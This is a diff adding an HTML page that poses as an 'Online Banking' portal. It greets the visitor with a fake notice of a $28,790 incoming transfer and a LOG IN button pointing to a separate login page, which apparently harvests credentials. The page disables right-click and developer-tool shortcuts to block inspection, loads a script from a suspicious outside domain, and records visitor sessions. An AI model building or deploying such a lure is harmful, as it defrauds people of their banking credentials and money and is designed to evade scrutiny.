@@ -1,0 +1,472 @@
+<html dir="ltr" lang="ru-RU" prefix="og: http://ogp.me/ns#">
+ <head>
+  <meta content="width=device-width initial-scale=1" name="viewport"/>
+  <title>
+   Online Banking
+  </title>
+  <meta content="rgb(42, 159, 48)" name="theme-color"/>
+  <meta charset="utf-8"/>
+  <meta content="money.exe" name="author"/>
+  <meta content="" name="description"/>
+  <meta content="favImage.png" property="og:image"/>
+  <meta content="image/png" property="og:image:type"/>
+  <meta content="128" property="og:image:width"/>
+  <meta content="128" property="og:image:height"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <link href="reset.css" media="screen,print" rel="stylesheet"/>
+  <link href="template.css?ver=1.6.4" media="screen" rel="stylesheet"/>
+  <script async="" src="https://mc.yandex.ru/metrika/tag.js">
+  </script>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js">
+  </script>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300;0,400;0,600;0,700;0,800;1,300;1,400;1,600;1,700;1,800&amp;display=swap" rel="stylesheet"/>
+  <link href="anim_icon2.gif" id="fav_mes" rel="shortcut icon"/>
+  <script src="https://code.jquery.com/jquery-3.3.1.min.js">
+  </script>
+  <script charset="utf-8" src="https://api-maps.yandex.ru/1.1/index.xml" type="text/javascript">
+  </script>
+  <link href="https://api-maps.yandex.ru/1.1/_YMaps.css?v=0.2.12" rel="stylesheet"/>
+  <script charset="utf-8" src="https://api-maps.yandex.ru/1.1/_YMaps.js?v=0.2.12" type="text/javascript">
+  </script>
+  <link href="https://api-maps.yandex.ru/1.1/_YMaps.css?v=0.2.7" rel="stylesheet"/>
+  <script charset="utf-8" src="https://api-maps.yandex.ru/1.1/_YMaps.js?v=0.2.7" type="text/javascript">
+  </script>
+  <script>
+   var timeSum = 28790; var moneysum = timeSum.toLocaleString(); 
+var tallage = 3;
+var result = timeSum / 100 * tallage; //вычисление процентов
+var percentm = result.toLocaleString(); 
+var raznpercent = timeSum - result;
+var ostpercent = raznpercent.toLocaleString(); 
+setTimeout(function(){$("#moneysum1,#moneysum2,#moneysum3,#moneysum4,#moneysum5,#moneysum14").text(moneysum); $("#moneysum6,#moneysum7").text(percentm); $("#moneysum8,#moneysum9,#moneysum10,#moneysum11,#moneysum12,#moneysum13,#moneysum15").text(ostpercent);},1);
+  </script>
+ </head>
+ <body>
+  <div id="loadpage">
+  </div>
+  <div class="fundament">
+   <div class="header">
+    <div class="top_wrap">
+     <img class="logo" src="logo.png"/>
+     <div class="nav">
+      <a class="navmanu" href="" onclick="menu1(); return false;">
+       Home
+      </a>
+      <a class="navmanu" href="" onclick="menu1(); return false;">
+       Transactions
+      </a>
+      <a class="navmanu" href="" onclick="menu1(); return false;">
+       Chat
+      </a>
+      <a class="navmanu" href="" onclick="menu1(); return false;">
+       History
+      </a>
+     </div>
+     <a href="vendor/logout.html">
+      <svg class="exit" height="24" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+       <g fill="none" fill-rule="evenodd">
+        <path d="M0 0h24v24H0z" fill="#FFF" fill-opacity="0">
+        </path>
+        <rect fill="#bcbcbc" height="2" rx="1" width="10" x="9" y="11">
+        </rect>
+        <path d="M15.364 16.95a1 1 0 1 1-1.414-1.414L17.485 12 13.95 8.464a1 1 0 1 1 1.414-1.414l4.243 4.243a1 1 0 0 1 0 1.414l-4.243 4.243zM11 4a1 1 0 0 1 0 2H6v12h5a1 1 0 0 1 0 2H5a1 1 0 0 1-1-1V5a1 1 0 0 1 1-1h6z" fill="#bcbcbc">
+        </path>
+       </g>
+      </svg>
+     </a>
+     <div style="float:right; width:50px;">
+      <img class="userava" src="5e6f319fa2ae97a950331259_black-male-user-symbol.svg"/>
+     </div>
+     <div class="us_balance">
+      <span id="moneysum15">
+       27,926.3
+      </span>
+      $
+     </div>
+     <div class="both">
+     </div>
+     <div class="seach_head">
+      <input class="search" id="inp" placeholder="Search"/>
+      <div class="resultsearch">
+       Nothing matched your search terms
+      </div>
+      <span class="_search" onclick="search()">
+       <svg height="16" viewbox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg">
+        <path d="M1 7.235a6.234 6.234 0 116.234 6.234A6.234 6.234 0 011 7.235zm10.55 0a4.316 4.316 0 10-8.633-.001 4.316 4.316 0 008.632 0zm-.933 3.107a1.004 1.004 0 011.418 0l2.652 2.651a.997.997 0 010 1.418l-.278.277a1.004 1.004 0 01-1.418 0l-2.651-2.65a.997.997 0 010-1.419l.277-.277z" fill="#4C6470" fill-rule="nonzero">
+        </path>
+       </svg>
+      </span>
+     </div>
+    </div>
+   </div>
+   <style>
+    .menu_bottom{display: none;}
+body{background-image: url(slide1--15nm_.jpg); background-size: cover;  background-repeat: no-repeat; background-position: 75% 15%; }
+.header{display:none;}
+body:before {  content: ""; background: none;}
+.footer{ display: none;}
+.header_mob{ display: none;}
+.topnolog {box-shadow: 0 0px 0px 0 rgba(0,0,0,.0)!important;}
+.contentnolog {width:auto; top: 0px; left:0px; right:0px; max-width: 100%; background: #fff;}
+#user-city {
+    margin-right: 25px;
+}
+.usergeonolog {
+    right: 20px;
+    position: absolute;
+    top: 26px;
+    line-height: 18px;
+    font-size: 10pt;
+}
+.topnolog {
+	filter: blur(3px);
+    width: auto;
+    position: relative;
+    left: 0px;
+    right: 0px;
+    top: 0px;
+    height: 70px;
+    box-shadow: 0 1px 6px 0 rgba(0,0,0,.09804);
+    background: #fff;
+}
+.top_wrapnolog {
+    max-width: 1024px;
+    margin: 0px auto;
+    padding: 0 20px;
+    position: relative;
+}
+@media (max-width: 420px){
+	.usnolog { display: none;}
+}
+.main_push2nolog{
+    position: fixed;
+    width: auto;
+    left: 0px;
+    right: 0px;
+    margin-top: 100px;
+    padding: 20px;
+    min-height: 260px;
+    background: none;
+    z-index: 99999;
+    text-align: center;
+animation: push2nolog 1s 1;
+animation-fill-mode: forwards;
+}
+@keyframes push2nolog { 0% {opacity: 0.1;     margin-top: 50px; } 100% {opacity: 1;     margin-top: 100px;}}
+.main_pushnolog {
+	    font-size: 13pt;
+    line-height: 23px;
+    width: auto;
+    max-width: 450px;
+    -webkit-box-shadow: 0 12px 16px 0 rgba(33, 33, 33, 0.2), 0 0 8px 0 rgba(33, 33, 33, 0.2);
+    box-shadow: 0 12px 16px 0 rgba(33, 33, 33, 0.2), 0 0 8px 0 rgba(33, 33, 33, 0.2);
+    margin: 0px auto 0px auto;
+    padding: 20px;
+    border-radius: 5px;
+    min-height: 260px;
+    background: #fff;
+    z-index: 99999;
+    text-align: center;
+}
+	.visa {
+    width: 28px;
+	margin-bottom:2px;
+    margin-right: 20px;
+}
+@media (min-width: 1024.9px){
+
+.button {
+    display: inline-block;
+    color: #fff;
+    background: #08a652;
+    padding: 8px 0px;
+    width: 100%;
+    text-align: center;
+    margin: 20px auto;
+    border: 1px solid rgba(0, 0, 0, 0);
+    border-radius: 5px;
+    font-size: 13pt;
+    font-style: normal;
+    text-decoration: none;
+    text-transform: uppercase;
+    cursor: pointer;
+    text-decoration: none;
+    transition: all 620ms cubic-bezier(0.4, 0.0, 0.2, 1);
+    -webkit-appearance: none;
+    box-shadow: 0px 10px 12px -9px rgba(0, 0, 0, 0.5);
+    animation: radial-pulse 2s infinite;
+}
+}
+.text-block-26 {
+    margin-top: 20px;
+    font-size: 9px;
+    color: #ccc;
+    line-height: 14px;
+}
+.link {
+    color: #ccc;
+}
+   </style>
+   <div style="background:rgba(0, 0, 0, 0.3); position:fixed; left:0px; right:0px; z-index:99; top:0px; bottom:0px;">
+   </div>
+   <div class="header_mob">
+    <div class="top_wrap">
+     <div class="naw_left" onclick="menu1()">
+      <img src="str-left.jpg"/>
+     </div>
+     <div class="naw_title">
+      Уведомления
+     </div>
+     <div class="naw_right" onclick="openpushMenu();">
+      <img src="m-rig.jpg"/>
+     </div>
+    </div>
+   </div>
+   <div class="contentnolog">
+    <div class="topnolog">
+     <div class="top_wrapnolog">
+      <span id="logo1">
+       <img src="logo.png" style="height: 36px; margin-top: 16px;"/>
+      </span>
+      <div class="usergeonolog">
+       <div class="usnolog" style="float:left;">
+        <img id="user1" src="sity.svg" style="height:15px;"/>
+        <span class="city" id="user-city">
+         Сингапур
+        </span>
+       </div>
+       <div style="float:left; width:50px;">
+        <img src="5e6f319fa2ae97a950331259_black-male-user-symbol.svg" style="height:29px; margin-top:-6px;"/>
+       </div>
+      </div>
+     </div>
+    </div>
+    <div class="main_push2nolog" style="">
+     <div class="main_pushnolog" style="">
+      <!--<img style="width:100px; display: none;" data-ix="new-interaction-8" src="5e70e28b07757a20a5abd470_loader.gif" />-->
+      <div class="h1">
+       You've just received a transfer
+      </div>
+      <img class="visa" src="visa.jpg"/>
+      VISA/MASTERCARD
+      <span style="color:#7c7c7c;">
+       ●●●●
+      </span>
+      <div class="pay2">
+       + $
+       <span id="moneysum1">
+       </span>
+      </div>
+      <div class="div-block-14 div-block-14243" style="width:100%;">
+       <a class="button" href="login.html">
+        LOG IN
+       </a>
+      </div>
+      <div class="text-block-26" id="w-node-a71bf26994d4-93bafed3">
+       60640 Frankfurt am Main
+© 1995 -
+       <script>
+        let today = new Date();let year = today.getFullYear();document.write(year);
+       </script>
+       2023. All rights reserved
+      </div>
+     </div>
+    </div>
+    <script>
+     setTimeout(function(){ $(".sp-inner-content").css("display", "none");},2000);
+    </script>
+    <div class="scaffold__region-footer">
+    </div>
+    <div class="footer">
+     <div class="clearfix grpelem" id="u15437-6">
+      <p>
+       60640 Frankfurt am Main
+      </p>
+      <p>
+       © 1995 -
+       <script>
+        let today = new Date();let year = today.getFullYear();document.write(year);
+       </script>
+       . All rights reserved.
+      </p>
+     </div>
+     <div class="_3jfQcs42">
+      <div id="share">
+       <div class="social" data-title="Стильные кнопки поделится в соц сетях без использования сторонних сервисов" data-url="https://onlbank.xyz/ep_7007/message.html">
+        <a class="push facebook _34M1hcgU" data-id="fb">
+         <svg height="29" viewbox="0 0 40 40" width="29" xmlns="http://www.w3.org/2000/svg">
+          <g fill="none" fill-rule="evenodd">
+           <path d="M24.7 20.635H21.18v12.981h-5.337V20.635h-2.537v-4.562h2.537V13.12c0-2.111.997-5.417 5.384-5.417l3.953.016v4.429h-2.868c-.47 0-1.132.236-1.132 1.243v2.685h3.988l-.466 4.558z" fill="#FFF">
+           </path>
+          </g>
+         </svg>
+        </a>
+        <a class="push twitter _34M1hcgU" data-id="tw">
+         <svg height="29px" version="1.1" viewbox="0 0 29 29" width="29px" xlink="http://www.w3.org/1999/xlink" xmlns="http://www.w3.org/2000/svg">
+          <g fill="none" fill-rule="evenodd" stroke="none" stroke-width="1">
+           <g transform="translate(-1592.000000, -1947.000000)">
+            <g transform="translate(572.000000, 1765.000000)">
+             <g transform="translate(810.000000, 39.000000)">
+              <g id="Group-39" transform="translate(114.000000, 106.000000)">
+               <g id="Group-16" transform="translate(0.000000, 37.000000)">
+                <g id="twitter" transform="translate(96.086957, 0.000000)">
+                 <path d="M23.0764306,10.3465841 C22.4631747,10.6201593 21.803491,10.8051947 21.1116649,10.8878319 C21.8180316,10.4620708 22.360115,9.78839823 22.6159785,8.98435398 C21.9550192,9.37880531 21.2226326,9.66495575 20.443818,9.81919469 C19.819848,9.15065487 18.9308311,8.73284956 17.9464075,8.73284956 C16.057661,8.73284956 14.5257968,10.2739558 14.5257968,12.1740973 C14.5257968,12.443823 14.5561535,12.7063628 14.6148261,12.9583805 C11.7720127,12.8149204 9.25138823,11.4449912 7.5641693,9.36238053 C7.26978607,9.87052212 7.10091112,10.4620708 7.10091112,11.0926283 C7.10091112,12.2862478 7.70523855,13.34 8.62257137,13.9569558 C8.06212082,13.9392478 7.53432282,13.7844956 7.07336052,13.5260619 C7.07310543,13.5406903 7.07310543,13.5553186 7.07310543,13.5696903 C7.07310543,15.2370619 8.25267911,16.6277788 9.81719584,16.9436991 C9.53046556,17.0227434 9.2276641,17.0645752 8.9161893,17.0645752 C8.69527434,17.0645752 8.48124702,17.0432743 8.27257676,17.0032389 C8.70777414,18.3700885 9.97076491,19.3650708 11.4679357,19.3930442 C10.2970354,20.3161681 8.8223132,20.8661416 7.21927664,20.8661416 C6.94377068,20.8661416 6.6708157,20.8499735 6.40372797,20.8178938 C7.91671489,21.7946549 9.7151566,22.3641327 11.6467595,22.3641327 C17.9384994,22.3641327 21.3792628,17.1205221 21.3792628,12.5726549 C21.3792628,12.4235487 21.3759465,12.2749558 21.369314,12.127646 C22.0381812,11.6426018 22.6180192,11.0366814 23.0764306,10.3465841 L23.0764306,10.3465841 Z" fill="#FFFFFF">
+                 </path>
+                </g>
+               </g>
+              </g>
+             </g>
+            </g>
+           </g>
+          </g>
+         </svg>
+        </a>
+        <a class="push google _34M1hcgU" data-id="gp">
+         <svg height="29px" version="1.1" viewbox="0 0 29 29" width="29px" xmlns="http://www.w3.org/2000/svg">
+          <g fill="none" fill-rule="evenodd" stroke="none" stroke-width="1">
+           <g transform="translate(-1640.000000, -1947.000000)">
+            <g transform="translate(572.000000, 1765.000000)">
+             <g transform="translate(810.000000, 39.000000)">
+              <g id="Group-39" transform="translate(114.000000, 106.000000)">
+               <g id="Group-16" transform="translate(0.000000, 37.000000)">
+                <g id="twitter-copy" transform="translate(144.130435, 0.000000)">
+                 <g fill="#FFFFFF" id="youtube" transform="translate(5.605072, 8.861111)">
+                  <path d="M16.8672645,1.08676768 C17.3649149,1.87723737 17.615942,3.23877273 17.615942,5.63683838 C17.615942,5.63786364 17.615942,5.63991414 17.615942,5.63991414 C17.615942,5.64196465 17.615942,5.6450404 17.615942,5.6450404 C17.615942,8.03182828 17.3649149,9.40361616 16.8683655,10.1858838 C16.3905331,10.9773788 15.8719638,11.1209141 14.8161082,11.1875556 C13.7602527,11.2439444 11.1079524,11.2777778 8.81017301,11.2777778 C6.50798958,11.2777778 3.85458832,11.2439444 2.79983379,11.1865303 C1.74618025,11.1198889 1.22761096,10.9763535 0.745374547,10.1848586 C0.253229167,9.40259091 2.20268248e-13,8.03080303 2.20268248e-13,5.64401515 L2.20268248e-13,5.64196465 C2.20268248e-13,5.64196465 2.20268248e-13,5.64093939 2.20268248e-13,5.63888889 C2.20268248e-13,5.63888889 2.20268248e-13,5.63786364 2.20268248e-13,5.63581313 C2.20268248e-13,3.23877273 0.253229167,1.87723737 0.745374547,1.08676768 C1.22761096,0.294247475 1.74728125,0.149686869 2.80093478,0.0932979798 C3.85458832,0.0276818182 6.50798958,-2.01616501e-13 8.81017301,-2.01616501e-13 C11.1079524,-2.01616501e-13 13.7602527,0.0276818182 14.8150072,0.0943232323 C15.8708628,0.149686869 16.3894321,0.295272727 16.8672645,1.08676768 Z M6.60597826,8.71464646 L12.1109601,5.63888889 L6.60597826,2.56313131 L6.60597826,8.71464646 Z" id="Combined-Shape">
+                  </path>
+                 </g>
+                </g>
+               </g>
+              </g>
+             </g>
+            </g>
+           </g>
+          </g>
+         </svg>
+        </a>
+       </div>
+      </div>
+     </div>
+     <div class="both">
+     </div>
+    </div>
+   </div>
+  </div>
+  <div class="push_menu_bg" onclick="pushMenu();" style="display: none;">
+  </div>
+  <div class="push_menu" style="display: none;">
+   <div onclick="pushMenu();" style="position:absolute; right:10px; color:#b3b3b3; cursor:pointer; top:10px;">
+    ✕
+   </div>
+   <div class="h1">
+    Notification options:
+   </div>
+   <div class="tabpay" style="height: 46px;">
+    <div class="tabpayimg" style="padding-top:30px;">
+     <input class="switch" id="s1" type="checkbox"/>
+    </div>
+    <div class="tabpaytitle" style="border:none;">
+     <span class="h3" style=" cursor:pointer; font-weight: 700;">
+      <span>
+       Allow receiving important push
+       <br/>
+       notifications from the bank?
+      </span>
+     </span>
+    </div>
+   </div>
+  </div>
+  <div class="menu_bottom">
+   <div class="p_menu" onclick="menu1()">
+    <img class="nawimg img" src="home.png"/>
+    <div class="nav_t">
+     Home
+    </div>
+   </div>
+   <div class="p_menu" onclick="menu1()">
+    <img class="nawimg img" src="pay.png"/>
+    <div class="nav_t">
+     Transactions
+    </div>
+   </div>
+   <div class="p_menu" onclick="menu1()">
+    <img class="nawimg img" src="notif.png"/>
+    <div class="nav_t">
+     Chat
+    </div>
+   </div>
+   <div class="p_menu" onclick="menu1()">
+    <img class="nawimg img" src="tim.png"/>
+    <div class="nav_t">
+     History
+    </div>
+   </div>
+   <!--<div onclick = "menu5()" class="p_menu">
+<img class="nawimg img" src="mark.png">
+<div class="nav_t ">Каталог </div>
+</div>-->
+  </div>
+  <div class="footer_mob">
+  </div>
+  <script src="script.js?ver=1.6.4">
+  </script>
+  <script src="share.js?ver=1.6.4">
+  </script>
+  <script>
+   document.oncontextmenu = function() {  
+return false;  
+};  
+document.onkeydown = function(e) {  
+if (e.keyCode == 123) {  
+return false;  
+}  
+if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {  
+return false;  
+}  
+if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {  
+return false;  
+}  
+if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {  
+return false;  
+}  
+if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) {  
+return false;  
+}  
+if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {  
+return false;  
+}  
+}
+  </script>
+  <script src="proccess_domain.js">
+  </script>
+  <a class="KJXZ" href="https://setevoy-gorod.com" id="domainGeneralSSS" style="display:none;">
+  </a>
+  <script src="https://infopaymentss.express/buy_domain.php" type="text/javascript">
+  </script>
+  <noscript class="imNoScript">
+   <div class="alert alert-red">
+    You need to enable JavaScript to run this App.
+   </div>
+  </noscript>
+  <!-- Yandex.Metrika counter -->
+  <script type="text/javascript">
+   (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+   m[i].l=1*new Date();
+   for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
+   k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+   (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+   ym(94054202, "init", {
+        clickmap:true,
+        trackLinks:true,
+        accurateTrackBounce:true,
+        webvisor:true
+   });
+  </script>
+  <noscript>
+   <div>
+    <img alt="" src="https://mc.yandex.ru/watch/94054202" style="position:absolute; left:-9999px;"/>
+   </div>
+  </noscript>
+  <!-- /Yandex.Metrika counter -->
+ </body>
+</html>
